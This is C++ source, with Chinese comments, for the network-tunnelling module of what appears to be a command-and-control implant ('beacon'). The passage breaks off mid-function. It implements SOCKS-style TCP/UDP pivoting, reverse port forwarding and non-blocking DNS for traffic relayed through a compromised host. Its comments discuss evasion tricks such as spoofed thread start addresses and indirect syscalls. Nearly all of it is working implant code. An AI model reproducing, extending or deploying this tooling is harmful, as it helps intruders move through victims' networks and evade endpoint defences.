#include "Proxyfire.h"
#include "OpsecThread.h"
#include <new>


/* ===== 域名解析：IP 直通 / 缓存 / 工作线程（设计与理由见 Proxyfire.h 顶部 DNS 段）=====
 *
 * 这一整段的唯一目的：**别让 gethostbyname 卡住心跳往返**。它原来直接跑在
 * Proxyfire_ConnectMessageTCP 里，是同步阻塞调用；目标机 DNS 慢或对某域名不回包时，
 * 一次解析就冻住整条链路（所有标签页 + 隧道 + 命令输出，因为共用一次心跳）。
 * 浏览器走 SOCKS5 是远端 DNS，域名原样丢过来，所以每个新域名都可能踩一次。 */

// beacon 的 crt.cpp 只提供 strlen/memcmp，没有 strcmp
static BOOL AxStrEq(const CHAR* a, const CHAR* b)
{
	while (*a && *a == *b) { ++a; ++b; }
	return (*a == *b);
}

// "a.b.c.d" → 网络序 32 位地址；不是合法 IPv4 字面量返回 FALSE
static BOOL AxParseIPv4(const CHAR* s, ULONG* outAddr)
{
	if (!s || !outAddr || !*s)
		return FALSE;

	ULONG parts[4] = { 0, 0, 0, 0 };
	int   idx = 0;
	ULONG val = 0;
	BOOL  digit = FALSE;

	for (const CHAR* p = s; ; ++p) {
		CHAR c = *p;

		if (c >= '0' && c <= '9') {
			val = val * 10 + (ULONG)(c - '0');
			if (val > 255 || idx > 3)
				return FALSE;
			digit = TRUE;
		}
		else if (c == '.' || c == '\0') {
			if (!digit)
				return FALSE;
			parts[idx++] = val;
			val = 0;
			digit = FALSE;
			if (c == '\0')
				break;
			if (idx > 3)
				return FALSE;
		}
		else {
			return FALSE;
		}
	}

	if (idx != 4)
		return FALSE;

	// sockaddr_in.sin_addr.s_addr 是网络序；x86 上 1.2.3.4 对应 0x04030201
	*outAddr = parts[0] | (parts[1] << 8) | (parts[2] << 16) | (parts[3] << 24);
	return TRUE;
}

// 解析单个槽（只在解析线程里调）
static void Proxyfire_DnsResolveSlot(DnsEntry* e)
{
	ULONG addr = 0;
	hostent* host = ApiWin->gethostbyname(e->name);
	if (host && host->h_addr_list && host->h_addr_list[0] && host->h_length == 4)
		memcpy(&addr, host->h_addr_list[0], 4);

	e->addr = addr;
	e->tick = ApiWin->GetTickCount();
	e->state = 1;   // ★ 最后发布：主循环只认 state==1，顺序反了会读到半成品
}

/* 常驻解析线程：把缓存里 state==2（待解析）的槽逐个解析掉，然后睡在事件上。
 *
 * ★★ 这个函数**永远不 return**：
 *    线程是 Opsec_CreateAsyncBofThread 起的（spoofed start address —— NtCreateThreadEx 以
 *    RtlUserThreadStart 建线程、挂起、把 Rip/Rcx 改到本函数、再恢复）。也就是说本函数跑在
 *    **被改过的 RtlUserThreadStart 栈帧**上，一旦 return 就落回那个帧 —— 实测直接让 beacon
 *    进程消失（无 WER 记录）；换成显式退出也观察到主循环停摆。常驻 + 永不退出从根上避开这一条。
 *    真走到退出分支时也用 NtTerminateThread 走内核路径，不经过返回地址。
 *
 * 缓存数组本身就是队列（state==2 即待解析），所以这里不需要额外的环形缓冲：
 * 扫一遍 → 有就解析 → 再扫 → 没有就等事件。生产者（主循环）只在 state==0/1 的槽上置 2，
 * 绝不会把"解析中"的槽重新置 2，所以不存在同一槽被解析两遍。 */
static DWORD WINAPI Proxyfire_ResolverProc(LPVOID param)
{
	Proxyfire* self = (Proxyfire*)param;

	for (;;) {
		BOOL didWork = FALSE;

		for (int i = 0; i < AX_DNS_CACHE_SIZE; i++) {
			if (self->dns[i].state != 2)
				continue;
			Proxyfire_DnsResolveSlot(&self->dns[i]);
			didWork = TRUE;
		}

		if (!didWork) {
			if (!self->resolverEvent || !ApiWin->WaitForSingleObject)
				break;   // 事件建不出来，这条线程没用了（下面显式退出）
			ApiWin->WaitForSingleObject(self->resolverEvent, 0xFFFFFFFF);   // INFINITE
		}
	}

	if (ApiNt && ApiNt->NtTerminateThread)
		ApiNt->NtTerminateThread((HANDLE)(LONG_PTR)-2, 0);   // (HANDLE)-2 == NtCurrentThread()
	return 0;
}

/* 主循环每轮调一次。懒创建：只有真出现待解析请求、且线程还没起时，才建一次 ——
 * 不开代理、或全走 IP 直通的载荷，一条线程都不会有。
 *
 * 位置放在主循环（不是隧道命令处理里）是为了和 BOF 异步起线程同上下文；但实测证明
 * **换成 spoofed 封装后两个位置一样出问题**，所以真正的分界是"用哪个 API 起"，不是"在哪起"。 */
void Proxyfire_EnsureResolver(Proxyfire* self)
{
	if (!self || self->resolverStarted)
		return;

	BOOL pending = FALSE;
	for (int i = 0; i < AX_DNS_CACHE_SIZE; i++) {
		if (self->dns[i].state == 2) { pending = TRUE; break; }
	}
	if (!pending)
		return;   // 没碰过代理（或全走 IP 直通）的载荷，一条线程都不会有

	HANDLE hEvent = ApiWin->CreateEventA(NULL, FALSE, FALSE, NULL);   // 自动重置
	if (!hEvent) {
		self->resolverFailed = TRUE;   // 让 DnsBegin 别再挂起，直接同步解析
		return;
	}

	// ★ 用朴素 CreateThread，**不用 Opsec_CreateAsyncBofThread**。实测（同机同日、三次独立构建，
	//   两个不同调用路径 + 两种线程函数收尾方式）只要走 spoofed 封装就是"进程消失"或
	//   "主循环停摆"；换成 CreateThread 全部正常。怀疑是那条路的间接系统调用
	//   （Indirect_NtCreateThreadEx / HaloPickSsn / syscall gadget）在本机 ntdll 上取错了 SSN 或 gadget
	//   —— 取错的典型后果正是"要么跑飞、要么吊死"。**这不是本文件该修的东西**，先绕开。
	HANDLE hThread = ApiWin->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Proxyfire_ResolverProc, self, 0, NULL);
	if (!hThread) {
		if (ApiNt && ApiNt->NtClose)
			ApiNt->NtClose(hEvent);
		self->resolverFailed = TRUE;
		return;
	}
	if (ApiNt && ApiNt->NtClose)
		ApiNt->NtClose(hThread);   // 线程句柄用不上（进程内没有 CloseHandle）

	self->resolverEvent   = hEvent;
	self->resolverStarted = TRUE;
}

// 找可用槽：命中未过期的返回它（*fresh），命中解析中的返回它（*resolving），
// 否则给一个空槽或最旧的**已完成**槽；实在没有（全在解析中）返回 -1。
// 解析中的槽绝不复用 —— 那样工作线程会往别人正在读的槽里写。
static int Proxyfire_DnsSlot(Proxyfire* self, const CHAR* name, BOOL* fresh, BOOL* resolving)
{
	ULONG now = ApiWin->GetTickCount();
	int   empty = -1, oldest = -1;
	ULONG oldestTick = 0;

	*fresh = FALSE;
	*resolving = FALSE;

	for (int i = 0; i < AX_DNS_CACHE_SIZE; i++) {
		DnsEntry* e = &self->dns[i];

		if (e->state == 0) {
			if (empty < 0) empty = i;
			continue;
		}

		if (AxStrEq(e->name, name)) {
			if (e->state == 2) { *resolving = TRUE; return i; }
			ULONG ttl = (e->addr != 0) ? AX_DNS_TTL_MS : AX_DNS_FAIL_TTL_MS;
			if (now - e->tick <= ttl) { *fresh = TRUE; return i; }
			return i;   // 过期：直接拿去重填
		}

		if (oldest < 0 || e->tick < oldestTick) { oldest = i; oldestTick = e->tick; }
	}

	if (empty >= 0)
		return empty;
	if (oldest >= 0 && self->dns[oldest].state == 1)
		return oldest;
	return -1;
}

static void Proxyfire_DnsFill(DnsEntry* e, const CHAR* name, ULONG addr)
{
	ULONG n = 0;
	while (name[n] && n < AX_DNS_NAME_MAX - 1) { e->name[n] = name[n]; ++n; }
	e->name[n] = '\0';
	e->addr = addr;
	e->tick = ApiWin->GetTickCount();
	e->state = 1;
}

// TCP 用。TRUE = 立刻有结果（*outAddr==0 表示解析失败）；FALSE = 已排队等解析，*outSlot 有效。
static BOOL Proxyfire_DnsBegin(Proxyfire* self, const CHAR* name, ULONG* outAddr, WORD* outSlot)
{
	BOOL fresh = FALSE, resolving = FALSE;
	int  idx = Proxyfire_DnsSlot(self, name, &fresh, &resolving);

	if (fresh)     { *outAddr = self->dns[idx].addr; return TRUE; }
	if (resolving) { *outSlot = (WORD)idx; return FALSE; }
	if (idx < 0)   { *outAddr = 0; return TRUE; }   // 64 个槽全在解析中：认栽，别阻塞心跳

	DnsEntry* e = &self->dns[idx];
	ULONG n = 0;
	while (name[n] && n < AX_DNS_NAME_MAX - 1) { e->name[n] = name[n]; ++n; }
	e->name[n] = '\0';
	e->addr = 0;
	e->tick = ApiWin->GetTickCount();
	e->state = 2;

	// 解析线程已经起来了：置位 + 唤醒它，通道等结果
	if (self->resolverStarted && self->resolverEvent) {
		ApiWin->SetEvent(self->resolverEvent);
		*outSlot = (WORD)idx;
		return FALSE;
	}

	// 线程一直建不起来（CreateEvent/建线程失败）：只能退回同步解析 ——
	// 宁可卡这一下，也别让这条通道挂到 deadline 才失败。
	if (self->resolverFailed) {
		Proxyfire_DnsResolveSlot(e);
		*outAddr = e->addr;
		return TRUE;
	}

	// 还没起（首次用到代理）：先挂起通道，主循环紧接着的 Proxyfire_EnsureResolver 会建线程
	*outSlot = (WORD)idx;
	return FALSE;
}

// UDP 用：保持"同步解析"的老行为（UDP 隧道少见，不值得为它引入挂起态），只加一层缓存。
static ULONG Proxyfire_DnsResolveSync(Proxyfire* self, const CHAR* name)
{
	BOOL fresh = FALSE, resolving = FALSE;
	int  idx = Proxyfire_DnsSlot(self, name, &fresh, &resolving);

	if (idx >= 0) {
		if (fresh)     return self->dns[idx].addr;
		if (resolving) return 0;
	}

	ULONG addr = 0;
	hostent* host = ApiWin->gethostbyname(name);
	if (host && host->h_addr_list && host->h_addr_list[0] && host->h_length == 4)
		memcpy(&addr, host->h_addr_list[0], 4);

	if (idx >= 0)
		Proxyfire_DnsFill(&self->dns[idx], name, addr);
	return addr;
}

// 起一条非阻塞 connect。**不在这里等、也不在这里判死**：在途的连接交给 CheckProxy 状态机
// （老代码在这里只 select 100ms，超时就判 WSAETIMEDOUT ⇒ 握手 >100ms 的目标一律打不开）。
static void Proxyfire_StartConnect(Proxyfire* self, ULONG channelId, ULONG type, ULONG addr, WORD port, Packer* outPacker)
{
	SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1) {
		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, WSAENOBUFS);
		return;
	}

	DWORD ioTimeout = 100;
	ApiWin->setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&ioTimeout, sizeof(ioTimeout));
	ApiWin->setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&ioTimeout, sizeof(ioTimeout));

	u_long mode = 1;
	ApiWin->ioctlsocket(sock, FIONBIO, &mode);

	sockaddr_in socketAddress = { 0 };
	socketAddress.sin_family      = AF_INET;
	socketAddress.sin_addr.s_addr = addr;
	socketAddress.sin_port        = _htons(port);

	int result = ApiWin->connect(sock, (sockaddr*)&socketAddress, sizeof(socketAddress));
	if (result == 0) {
		Proxyfire_AddProxyData(self, channelId, type, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, port, TUNNEL_STATE_CONNECT);
		return;
	}

	int connectError = ApiWin->WSAGetLastError();
	if (connectError != WSAEWOULDBLOCK) {
		ApiWin->closesocket(sock);
		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, connectError);
		return;
	}

	Proxyfire_AddProxyData(self, channelId, type, sock, (ULONG)AX_TUNNEL_CONNECT_TIMEOUT_MS,
	                       TUNNEL_MODE_SEND_TCP, 0, port, TUNNEL_STATE_CONNECT);
}

// 把通道挂进"等解析"档，并记下用哪个缓存槽；socket 是 INVALID_SOCKET（还没建）
static void Proxyfire_AddResolvingChannel(Proxyfire* self, ULONG channelId, ULONG type, WORD port, WORD slot)
{
	Proxyfire_AddProxyData(self, channelId, type, INVALID_SOCKET, (ULONG)AX_TUNNEL_RESOLVE_TIMEOUT_MS,
	                       TUNNEL_MODE_SEND_TCP, 0, port, TUNNEL_STATE_RESOLVE);
	if (self->tunnels.size() > 0)
		self->tunnels[self->tunnels.size() - 1].dnsSlot = slot;
}


void PackProxyStatus(Packer* packer, ULONG channelId, ULONG commandId, ULONG type, ULONG result)
{
	Packer_Pack32(packer, channelId);
	Packer_Pack32(packer, commandId);
	Packer_Pack32(packer, type);
	Packer_Pack32(packer, result);
}

void PackProxyControl(Packer* packer, ULONG channelId, ULONG commandId)
{
	Packer_Pack32(packer, channelId);
	Packer_Pack32(packer, commandId);
}

void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
{
	Packer_Pack32(packer, channelId);
	Packer_Pack32(packer, COMMAND_TUNNEL_WRITE_TCP);
	Packer_PackBytes(packer, data, dataSize);
}

void Proxyfire_AddProxyData(Proxyfire* self, ULONG channelId, ULONG type, SOCKET sock, ULONG waitTime, ULONG mode, ULONG address, WORD port, ULONG state)
{
	TunnelData tunnelData = { 0 };
	tunnelData.channelID = channelId;
	tunnelData.type            = type;
	tunnelData.sock            = sock;
	tunnelData.waitTime        = waitTime;
	tunnelData.mode            = mode;
	tunnelData.state           = state;
	tunnelData.i_address       = address;
	tunnelData.port            = port;
	tunnelData.startTick       = ApiWin->GetTickCount();
	tunnelData.writeBuffer     = NULL;
	tunnelData.writeBufferSize = 0;
	tunnelData.paused          = FALSE;
	tunnelData.server_paused   = FALSE;
	self->tunnels.push_back(tunnelData);
}

//////////

SOCKET listenSocket(u_short port, int stream)
{
	WSAData WSAData;
	if (ApiWin->WSAStartup(514u, &WSAData) < 0)
		return -1;

	SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1)
		return -1;

	struct sockaddr_in saddr = { 0 };
	saddr.sin_family = AF_INET;
	saddr.sin_port = _htons(port);

	u_long argp = 1;
	int result = ApiWin->ioctlsocket(sock, FIONBIO, &argp);
	if (result != -1) {

		result = ApiWin->bind(sock, (struct sockaddr*)&saddr, sizeof(sockaddr));
		if (result != -1) {

			result = ApiWin->listen(sock, stream);
			if (result != -1) {
				return sock;
			}
		}
	}
	ApiWin->closesocket(sock);
	return -1;
}

void Proxyfire_ConnectMessageTCP(Proxyfire* self, ULONG channelId, ULONG type, CHAR* address, WORD port, Packer* outPacker)
{
	// 服务端为一条新的代理连接要通道 ⇒ 代理开始被使用，先按快档算，别让首个请求等 sleep_delay。
	self->activeTick = ApiWin->GetTickCount();
	self->armedTick  = self->activeTick;

	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		ApiWin->WSACleanup();
		return;
	}

	// ① 本来就是 IP 字面量：一个字都不查（proxychains / nmap / 手工填 IP 全走这条）
	ULONG addr = 0;
	if (AxParseIPv4(address, &addr)) {
		Proxyfire_StartConnect(self, channelId, type, addr, port, outPacker);
		return;
	}

	// ② 缓存命中就立刻用；③ 没命中丢工作线程，通道挂起等结果 —— 两者都不阻塞心跳
	WORD slot = 0;
	if (Proxyfire_DnsBegin(self, address, &addr, &slot)) {
		if (addr == 0) {
			// 解析失败（含负缓存命中）。给个明确的 SOCKS 错误，别让浏览器干等。
			PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, WSAHOST_NOT_FOUND);
			return;
		}
		Proxyfire_StartConnect(self, channelId, type, addr, port, outPacker);
		return;
	}

	Proxyfire_AddResolvingChannel(self, channelId, type, port, slot);
	// ★ 这里**故意不 WSACleanup**：解析线程还在用 Winsock（gethostbyname），
	//   引用计数归零会把它脚下的地毯抽掉。WSA 的引用计数只增不减在进程内无害。
}

void Proxyfire_ConnectMessageUDP(Proxyfire* self, ULONG channelId, CHAR* address, WORD port, Packer* outPacker)
{
	// 同 ConnectMessageTCP：新通道 = 代理在用。
	self->activeTick = ApiWin->GetTickCount();
	self->armedTick  = self->activeTick;

	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		ApiWin->WSACleanup();
		return;
	}
	else {
		SOCKET sock = ApiWin->socket(AF_INET, SOCK_DGRAM, 0);
		if (sock != -1) {
			// IP 直通，其余走带缓存的同步解析（UDP 隧道少见，不值得为它引入挂起态）
			ULONG addr = 0;
			if (AxParseIPv4(address, &addr) || (addr = Proxyfire_DnsResolveSync(self, address)) != 0) {
				sockaddr_in socketAddress = { 0 };
				socketAddress.sin_family = AF_INET;
				if (ApiWin->bind(sock, (sockaddr*)&socketAddress, sizeof(socketAddress)) == 0) {
					u_long mode = 1;
					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
						Proxyfire_AddProxyData(self, channelId, 2, sock, 30000, TUNNEL_MODE_SEND_UDP, addr, port, TUNNEL_STATE_CONNECT);
						return;
					}
				}
			}
		}
		ULONG error = ApiWin->WSAGetLastError();

		ApiWin->closesocket(sock);
		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, 2, error);
	}
}

void Proxyfire_ConnectWriteTCP(Proxyfire* self, ULONG channelId, CHAR* data, ULONG dataSize, Packer* outPacker)
{
	if (data == NULL || dataSize == 0)
		return;

	// 服务端把浏览器/工具的字节送进来了 —— 这就是"有人在用这条代理"，
	// 立刻把轮询档位拉到快档（见 Proxyfire_PollDelayMs）。
	self->activeTick = ApiWin->GetTickCount();

	TunnelData* tunnelData;
	for (int i = 0; i < self->tunnels.size(); i++) {
		tunnelData = &(self->tunnels[i]);

		if (tunnelData->channelID != channelId || tunnelData->state != TUNNEL_STATE_READY)
			continue;

		if (tunnelData->writeBuffer != NULL && tunnelData->writeBufferSize > 0) {

			if (tunnelData->writeBufferSize + dataSize > TUNNEL_BUFFER_HARD_CAP) {
				ApiWin->closesocket(tunnelData->sock);
				tunnelData->state = TUNNEL_STATE_CLOSE;

				MemFreeLocal((LPVOID*) & tunnelData->writeBuffer, tunnelData->writeBufferSize);
				tunnelData->writeBuffer = NULL;
				tunnelData->writeBufferSize = 0;

				if (outPacker)
					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
				return;
			}

			CHAR* newBuf = (CHAR*)MemReallocLocal(tunnelData->writeBuffer, tunnelData->writeBufferSize + dataSize);
			if (newBuf == NULL) {
				ApiWin->closesocket(tunnelData->sock);
				tunnelData->state = TUNNEL_STATE_CLOSE;

				MemFreeLocal((LPVOID*) &tunnelData->writeBuffer, tunnelData->writeBufferSize);
				tunnelData->writeBuffer = NULL;
				tunnelData->writeBufferSize = 0;

				if (outPacker)
					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
				return;
			}

			tunnelData->writeBuffer = newBuf;
			memcpy(tunnelData->writeBuffer + tunnelData->writeBufferSize, data, dataSize);
			tunnelData->writeBufferSize += dataSize;

			if (outPacker && tunnelData->writeBufferSize > TUNNEL_BUFFER_HIGH_WATERMARK && !tunnelData->paused) {
				tunnelData->paused = TRUE;
				PackProxyControl(outPacker, channelId, COMMAND_TUNNEL_PAUSE);
			}
			return;
		}

		int sent = ApiWin->send(tunnelData->sock, data, (int)dataSize, 0);
		if (sent == -1) {
			int err = ApiWin->WSAGetLastError();
			if (err == WSAEWOULDBLOCK) {
				sent = 0;
			}
			else {
				ApiWin->closesocket(tunnelData->sock);
				tunnelData->state = TUNNEL_STATE_CLOSE;

				if (outPacker)
					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, err);
				return;
			}
		}

		if (sent < (int)dataSize) {
			ULONG remain = dataSize - (ULONG)sent;

			if (remain > TUNNEL_BUFFER_HARD_CAP) {
				ApiWin->closesocket(tunnelData->sock);
				tunnelData->state = TUNNEL_STATE_CLOSE;

				if (outPacker)
					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
				return;
			}

			tunnelData->writeBuffer = (CHAR*)MemAllocLocal(remain);
			if (tunnelData->writeBuffer == NULL) {
				ApiWin->closesocket(tunnelData->sock);
				tunnelData->state = TUNNEL_STATE_CLOSE;

				if (outPacker)
					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_CLOSE, 0, WSAENOBUFS);
				return;
			}

			memcpy(tunnelData->writeBuffer, data + sent, remain);
			tunnelData->writeBufferSize = remain;

			if (outPacker && tunnelData->writeBufferSize > TUNNEL_BUFFER_HIGH_WATERMARK && !tunnelData->paused) {
				tunnelData->paused = TRUE;
				PackProxyControl(outPacker, channelId, COMMAND_TUNNEL_PAUSE);
			}
		}
		return;
	}
	tunnelData = NULL;
}

void Proxyfire_ConnectWriteUDP(Proxyfire* self, ULONG channelId, CHAR* data, ULONG dataSize)
{
	TunnelData* tunnelData;
	for (int i = 0; i < self->tunnels.size(); i++) {
		tunnelData = &(self->tunnels[i]);
		if ( tunnelData->channelID == channelId && tunnelData->state == TUNNEL_STATE_READY ) {
			DWORD finishTick = ApiWin->GetTickCount() + 30000;
			timeval timeout = { 0, 100 };
			fd_set exceptfds;
			fd_set writefds;
			while (ApiWin->GetTickCount() < finishTick) {
				writefds.fd_array[0] = tunnelData->sock;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds))
					break;
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
					sockaddr_in addr_to;
					addr_to.sin_family = AF_INET;
					addr_to.sin_port = _htons(tunnelData->port);
					addr_to.sin_addr.S_un.S_addr = tunnelData->i_address;

					ApiWin->sendto(tunnelData->sock, data, dataSize, 0, (const struct sockaddr*)&addr_to, 16);
				}
			}
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire_ConnectPause(Proxyfire* self, ULONG channelId)
{
	for (int i = 0; i < self->tunnels.size(); i++) {
		TunnelData* t = &(self->tunnels[i]);
		if (t->channelID == channelId) {
			t->server_paused = TRUE;
			return;
		}
	}
}

void Proxyfire_ConnectResume(Proxyfire* self, ULONG channelId)
{
	for (int i = 0; i < self->tunnels.size(); i++) {
		TunnelData* t = &(self->tunnels[i]);
		if (t->channelID == channelId) {
			t->server_paused = FALSE;
			return;
		}
	}
}

void Proxyfire_ConnectClose(Proxyfire* self, ULONG channelId)
{
	TunnelData* tunnelData;
	for (int i = 0; i < self->tunnels.size(); i++) {
		tunnelData = &(self->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state != TUNNEL_STATE_CLOSE) {
			tunnelData->state = TUNNEL_STATE_CLOSE;
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire_ConnectMessageReverse(Proxyfire* self, ULONG tunnelId, WORD port, Packer* outPacker)
{
	for (int i = 0; i < self->tunnels.size(); i++) {
		TunnelData tunnelData = self->tunnels[i];
		if (tunnelData.mode == TUNNEL_MODE_REVERSE_TCP && tunnelData.port == port && tunnelData.state != TUNNEL_STATE_CLOSE) {
			PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, tunnelData.type, TUNNEL_CREATE_ERROR);
			return;
		}
	}

	SOCKET sock = listenSocket(port, 10);
	if (sock == -1) {
		PackProxyStatus(outPacker,tunnelId, COMMAND_TUNNEL_REVERSE, 5, TUNNEL_CREATE_ERROR);
		return;
	}
	
	Proxyfire_AddProxyData(self, tunnelId, 5, sock, 0, TUNNEL_MODE_REVERSE_TCP, 0, port, TUNNEL_STATE_CONNECT);

	PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, 5, TUNNEL_STATE_CONNECT);
}

///////////////////

void Proxyfire_CheckProxy(Proxyfire* self, Packer* packer)
{
	TunnelData* tunnelData;
	// 0 = 只轮询不等待。连接在途的通道现在会**跨轮次**停留（见 ConnectMessageTCP），
	// 每个待连通道各等 100ms 的话，20 个并发连接就会把一轮心跳拖成 2 秒 ——
	// 那一轮里所有通道（含已经连上的）都别想走。完成与否下一轮（≤50ms 后）再判，
	// 判死的兜底是下面 startTick/waitTime 那条。
	timeval timeout = { 0, 0 };
	for (int i = 0; i < self->tunnels.size(); i++) {
		tunnelData = &(self->tunnels[i]);

		// 等解析的通道：工作线程出结果就转成连接态，超时就认失败。
		// 这一档的存在意义就是"心跳不等 DNS"——解析在后台跑，这里每轮只是看一眼。
		if (tunnelData->state == TUNNEL_STATE_RESOLVE) {
			DnsEntry* de = (tunnelData->dnsSlot < AX_DNS_CACHE_SIZE) ? &self->dns[tunnelData->dnsSlot] : NULL;

			if (de && de->state == 1) {
				// ★ 先把要用的都取出来：Proxyfire_StartConnect 会 push_back，
				//   Vector 一旦扩容搬移，tunnelData 立刻失效。
				ULONG cid   = tunnelData->channelID;
				ULONG ctype = tunnelData->type;
				WORD  cport = tunnelData->port;
				ULONG addr  = de->addr;

				tunnelData->state = TUNNEL_STATE_CLOSE;   // 这条记录的使命结束，交给 CloseProxy 收走
				tunnelData = NULL;

				if (addr == 0) {
					PackProxyStatus(packer, cid, COMMAND_TUNNEL_START_TCP, ctype, WSAHOST_NOT_FOUND);
				}
				else {
					Proxyfire_StartConnect(self, cid, ctype, addr, cport, packer);
				}
			}
			else if (ApiWin->GetTickCount() - tunnelData->startTick > tunnelData->waitTime) {
				tunnelData->state = TUNNEL_STATE_CLOSE;
				PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, WSAETIMEDOUT);
			}
			continue;
		}

		if (tunnelData->state == TUNNEL_STATE_CONNECT) {
			ULONG channelId = tunnelData->channelID;
			fd_set readfds;
			readfds.fd_count = 1;
			readfds.fd_array[0] = tunnelData->sock;
			fd_set exceptfds;
			exceptfds.fd_count = 1;
			exceptfds.fd_array[0] = tunnelData->sock;
			fd_set writefds;
			writefds.fd_count = 1;
			writefds.fd_array[0] = tunnelData->sock;
			ApiWin->select(0, &readfds, &writefds, &exceptfds, &timeout);
			
			if ( tunnelData->mode == TUNNEL_MODE_REVERSE_TCP ) {

				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
					SOCKET sock = ApiWin->accept(tunnelData->sock, 0, 0);
					u_long mode = 1;
					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) == -1) {
						ApiWin->closesocket(sock);
						continue;
					}

					ULONG cid = GenerateRandom32();

					Packer_Pack32(packer, tunnelData->channelID); // tunnel ID
					Packer_Pack32(packer, COMMAND_TUNNEL_ACCEPT);
					Packer_Pack32(packer, cid);

					Proxyfire_AddProxyData(self, cid, 5, sock, 180000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_READY);
				}
			}
			else {
				if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {
					if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
						tunnelData->state = TUNNEL_STATE_CLOSE;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
						continue;
					}
					if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
						tunnelData->state = TUNNEL_STATE_READY;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
						continue;
					}
				}
				else {
					if (tunnelData->mode == TUNNEL_MODE_SEND_TCP) {
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
							continue;
						}
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
							tunnelData->state = TUNNEL_STATE_READY;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
							continue;
						}
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
							SOCKET listenSock = tunnelData->sock;
							SOCKET tmp_sock_2 = ApiWin->accept(listenSock, 0, 0);
							if (tmp_sock_2 == -1) {
								tunnelData->state = TUNNEL_STATE_CLOSE;
								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
							}
							else {
								tunnelData->sock = tmp_sock_2;
								tunnelData->state = TUNNEL_STATE_READY;
								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
							}
							ApiWin->closesocket(listenSock);
							continue;
						}
					}
				}
				if (ApiWin->GetTickCount() - tunnelData->startTick > tunnelData->waitTime) {
					tunnelData->state = TUNNEL_STATE_CLOSE;
					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
				}
			}
		}
	}
	tunnelData = NULL;
}

ULONG Proxyfire_RecvProxy(Proxyfire* self, Packer* packer)
{
	ULONG count = 0;
	LPVOID buffer = MemAllocLocal(0x10000);
	TunnelData* tunnelData;
	for (int i = 0; i < self->tunnels.size(); i++) {

		if (Packer_datasize(packer) > 0x400000)
			break;

		tunnelData = &(self->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_READY) {

			if (tunnelData->server_paused)
				continue;

			if (tunnelData->writeBufferSize > TUNNEL_BUFFER_HIGH_WATERMARK)
				continue;

			if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {

				LPVOID buffer = MemAllocLocal(0xFFFFC);
				struct sockaddr_in clientAddr = { 0 };
				int clientAddrLen = sizeof(sockaddr_in);

				int readed = ApiWin->recvfrom(tunnelData->sock, (CHAR*) buffer, 0xFFFFC, 0, (struct sockaddr*)&clientAddr, &clientAddrLen);
				if (readed == -1) {
					if (ApiWin->WSAGetLastError() != WSAEWOULDBLOCK) {
						tunnelData->state = TUNNEL_STATE_CLOSE;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 				   }
				}
				else if (readed) {
					PackProxyData(packer, tunnelData->channelID, (PBYTE)buffer, readed);
					++count;
				}
				MemFreeLocal(&buffer, 0xFFFFC);
			}
